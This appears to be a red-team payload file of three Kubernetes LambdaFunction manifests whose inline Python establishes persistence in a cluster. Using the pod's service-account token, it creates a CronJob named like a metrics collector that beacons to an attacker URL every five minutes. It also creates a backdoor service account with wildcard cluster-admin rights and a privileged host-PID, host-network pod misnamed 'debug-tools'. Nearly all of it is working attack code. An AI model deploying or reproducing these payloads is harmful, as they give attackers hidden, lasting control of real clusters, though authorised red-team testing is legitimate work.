# Payload: Persistence Mechanisms as LambdaFunction
# ⚠️ AUTHORIZED TESTING ONLY
#
# Establishes persistent access using Kubernetes API.
# Creates backdoor SA, CronJob beacon, and web shell pod.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: payload-persistence-full
  labels:
    redteam: "true"
    exploit: "payload-persistence"
    category: "persistence"
    severity: "critical"
  annotations:
    redteam.knative.io/description: "Full persistence - CronJob beacon, backdoor SA, web shell"
    redteam.knative.io/expected-result: "Persistent access to cluster"
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import ssl
        import json
        import urllib.request
        
        K8S_API = "https://kubernetes.default.svc"
        TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        CA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
        
        def get_k8s_client():
            """Get Kubernetes API client configuration"""
            with open(TOKEN_PATH, 'r') as f:
                token = f.read().strip()
            ssl_context = ssl.create_default_context()
            ssl_context.load_verify_locations(CA_PATH)
            return token, ssl_context
        
        def k8s_api_call(method, url, token, ssl_context, data=None):
            """Make Kubernetes API call"""
            req = urllib.request.Request(
                url,
                data=json.dumps(data).encode('utf-8') if data else None,
                method=method,
                headers={
                    'Authorization': f'Bearer {token}',
                    'Content-Type': 'application/json'
                }
            )
            with urllib.request.urlopen(req, context=ssl_context) as response:
                return json.loads(response.read())
        
        def create_beacon_cronjob(namespace, attacker_url, beacon_interval="*/5 * * * *"):
            """Create CronJob that beacons to attacker"""
            token, ssl_ctx = get_k8s_client()
            cronjob = {
                "apiVersion": "batch/v1",
                "kind": "CronJob",
                "metadata": {
                    "name": "system-metrics-collector",
                    "namespace": namespace,
                    "labels": {"app.kubernetes.io/component": "metrics"}
                },
                "spec": {
                    "schedule": beacon_interval,
                    "successfulJobsHistoryLimit": 1,
                    "failedJobsHistoryLimit": 1,
                    "jobTemplate": {
                        "spec": {
                            "template": {
                                "spec": {
                                    "containers": [{
                                        "name": "collector",
                                        "image": "curlimages/curl:latest",
                                        "command": ["/bin/sh", "-c"],
                                        "args": [f"curl -s {attacker_url}/beacon?h=$(hostname)&t=$(date +%s)"]
                                    }],
                                    "restartPolicy": "Never"
                                }
                            }
                        }
                    }
                }
            }
            url = f"{K8S_API}/apis/batch/v1/namespaces/{namespace}/cronjobs"
            return k8s_api_call('POST', url, token, ssl_ctx, cronjob)
        
        def create_backdoor_sa(namespace):
            """Create service account with cluster-admin"""
            token, ssl_ctx = get_k8s_client()
            
            # ServiceAccount
            sa = {"apiVersion": "v1", "kind": "ServiceAccount", 
                  "metadata": {"name": "system-admin", "namespace": namespace}}
            try:
                k8s_api_call('POST', f"{K8S_API}/api/v1/namespaces/{namespace}/serviceaccounts", token, ssl_ctx, sa)
            except: pass
            
            # ClusterRole
            role = {
                "apiVersion": "rbac.authorization.k8s.io/v1",
                "kind": "ClusterRole",
                "metadata": {"name": "system-admin-role"},
                "rules": [{"apiGroups": ["*"], "resources": ["*"], "verbs": ["*"]}]
            }
            try:
                k8s_api_call('POST', f"{K8S_API}/apis/rbac.authorization.k8s.io/v1/clusterroles", token, ssl_ctx, role)
            except: pass
            
            # ClusterRoleBinding
            binding = {
                "apiVersion": "rbac.authorization.k8s.io/v1",
                "kind": "ClusterRoleBinding",
                "metadata": {"name": "system-admin-binding"},
                "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole", "name": "system-admin-role"},
                "subjects": [{"kind": "ServiceAccount", "name": "system-admin", "namespace": namespace}]
            }
            return k8s_api_call('POST', f"{K8S_API}/apis/rbac.authorization.k8s.io/v1/clusterrolebindings", token, ssl_ctx, binding)
        
        def create_web_shell_pod(namespace):
            """Create privileged pod for persistent access"""
            token, ssl_ctx = get_k8s_client()
            pod = {
                "apiVersion": "v1",
                "kind": "Pod",
                "metadata": {"name": "debug-tools", "namespace": namespace, "labels": {"app": "debug"}},
                "spec": {
                    "containers": [{
                        "name": "shell",
                        "image": "alpine:latest",
                        "command": ["/bin/sh", "-c"],
                        "args": ["while true; do sleep 3600; done"],
                        "securityContext": {"privileged": True}
                    }],
                    "hostNetwork": True,
                    "hostPID": True,
                    "serviceAccountName": "system-admin"
                }
            }
            return k8s_api_call('POST', f"{K8S_API}/api/v1/namespaces/{namespace}/pods", token, ssl_ctx, pod)
        
        def handler(event, context=None):
            """
            Establish persistence mechanisms.
            
            Event payload:
              - namespace: Target namespace (default: from SA token)
              - attacker_url: URL for beacon callbacks
              - beacon_interval: Cron schedule (default: */5 * * * *)
              - mechanisms: List of mechanisms to deploy (default: all)
                           Options: cronjob, backdoor_sa, web_shell
            """
            attacker_url = event.get('attacker_url') or os.environ.get('ATTACKER_URL', 'http://attacker.example.com')
            beacon_interval = event.get('beacon_interval', '*/5 * * * *')
            mechanisms = event.get('mechanisms', ['cronjob', 'backdoor_sa', 'web_shell'])
            
            # Get namespace from SA token if not provided
            namespace = event.get('namespace')
            if not namespace:
                try:
                    with open("/var/run/secrets/kubernetes.io/serviceaccount/namespace", 'r') as f:
                        namespace = f.read().strip()
                except:
                    namespace = "default"
            
            results = {"namespace": namespace}
            
            if 'cronjob' in mechanisms:
                try:
                    results['cronjob'] = create_beacon_cronjob(namespace, attacker_url, beacon_interval)
                    results['cronjob_status'] = 'created'
                except Exception as e:
                    results['cronjob_error'] = str(e)
            
            if 'backdoor_sa' in mechanisms:
                try:
                    results['backdoor_sa'] = create_backdoor_sa(namespace)
                    results['backdoor_sa_status'] = 'created'
                except Exception as e:
                    results['backdoor_sa_error'] = str(e)
            
            if 'web_shell' in mechanisms:
                try:
                    results['web_shell'] = create_web_shell_pod(namespace)
                    results['web_shell_status'] = 'created'
                except Exception as e:
                    results['web_shell_error'] = str(e)
            
            return results
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
  env:
    - name: ATTACKER_URL
      value: ""
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: payload-persistence-cronjob
  labels:
    redteam: "true"
    exploit: "payload-persistence"
    category: "persistence"
    severity: "high"
    variant: "cronjob-only"
  annotations:
    redteam.knative.io/description: "Deploy beacon CronJob only"
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import ssl
        import json
        import urllib.request
        
        K8S_API = "https://kubernetes.default.svc"
        
        def handler(event, context=None):
            """Deploy beacon CronJob"""
            attacker_url = event.get('attacker_url') or os.environ.get('ATTACKER_URL')
            if not attacker_url:
                return {"error": "attacker_url required"}
            
            namespace = event.get('namespace', 'default')
            beacon_interval = event.get('beacon_interval', '*/5 * * * *')
            
            with open("/var/run/secrets/kubernetes.io/serviceaccount/token", 'r') as f:
                token = f.read().strip()
            
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.load_verify_locations("/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")
            
            cronjob = {
                "apiVersion": "batch/v1",
                "kind": "CronJob",
                "metadata": {"name": "system-metrics", "namespace": namespace},
                "spec": {
                    "schedule": beacon_interval,
                    "jobTemplate": {
                        "spec": {
                            "template": {
                                "spec": {
                                    "containers": [{
                                        "name": "beacon",
                                        "image": "curlimages/curl:latest",
                                        "command": ["/bin/sh", "-c"],
                                        "args": [f"curl -s {attacker_url}/beacon?h=$(hostname)"]
                                    }],
                                    "restartPolicy": "Never"
                                }
                            }
                        }
                    }
                }
            }
            
            req = urllib.request.Request(
                f"{K8S_API}/apis/batch/v1/namespaces/{namespace}/cronjobs",
                data=json.dumps(cronjob).encode('utf-8'),
                method='POST',
                headers={'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
            )
            
            try:
                with urllib.request.urlopen(req, context=ssl_ctx) as resp:
                    return {"status": "created", "cronjob": json.loads(resp.read())}
            except Exception as e:
                return {"error": str(e)}
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: payload-persistence-backdoor-sa
  labels:
    redteam: "true"
    exploit: "payload-persistence"
    category: "rbac-escalation"
    severity: "critical"
    variant: "backdoor-sa-only"
  annotations:
    redteam.knative.io/description: "Create backdoor ServiceAccount with cluster-admin"
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import ssl
        import json
        import urllib.request
        
        K8S_API = "https://kubernetes.default.svc"
        
        def k8s_post(url, data, token, ssl_ctx):
            req = urllib.request.Request(
                url, data=json.dumps(data).encode('utf-8'), method='POST',
                headers={'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
            )
            with urllib.request.urlopen(req, context=ssl_ctx) as resp:
                return json.loads(resp.read())
        
        def handler(event, context=None):
            """Create backdoor SA with cluster-admin"""
            namespace = event.get('namespace', 'default')
            sa_name = event.get('sa_name', 'system-admin')
            
            with open("/var/run/secrets/kubernetes.io/serviceaccount/token", 'r') as f:
                token = f.read().strip()
            
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.load_verify_locations("/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")
            
            results = {}
            
            # Create SA
            try:
                sa = {"apiVersion": "v1", "kind": "ServiceAccount", 
                      "metadata": {"name": sa_name, "namespace": namespace}}
                results['sa'] = k8s_post(f"{K8S_API}/api/v1/namespaces/{namespace}/serviceaccounts", sa, token, ssl_ctx)
            except Exception as e:
                results['sa_error'] = str(e)
            
            # Create ClusterRole
            try:
                role = {
                    "apiVersion": "rbac.authorization.k8s.io/v1",
                    "kind": "ClusterRole",
                    "metadata": {"name": f"{sa_name}-role"},
                    "rules": [{"apiGroups": ["*"], "resources": ["*"], "verbs": ["*"]}]
                }
                results['role'] = k8s_post(f"{K8S_API}/apis/rbac.authorization.k8s.io/v1/clusterroles", role, token, ssl_ctx)
            except Exception as e:
                results['role_error'] = str(e)
            
            # Create ClusterRoleBinding
            try:
                binding = {
                    "apiVersion": "rbac.authorization.k8s.io/v1",
                    "kind": "ClusterRoleBinding",
                    "metadata": {"name": f"{sa_name}-binding"},
                    "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole", "name": f"{sa_name}-role"},
                    "subjects": [{"kind": "ServiceAccount", "name": sa_name, "namespace": namespace}]
                }
                results['binding'] = k8s_post(f"{K8S_API}/apis/rbac.authorization.k8s.io/v1/clusterrolebindings", binding, token, ssl_ctx)
            except Exception as e:
                results['binding_error'] = str(e)
            
            return results
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
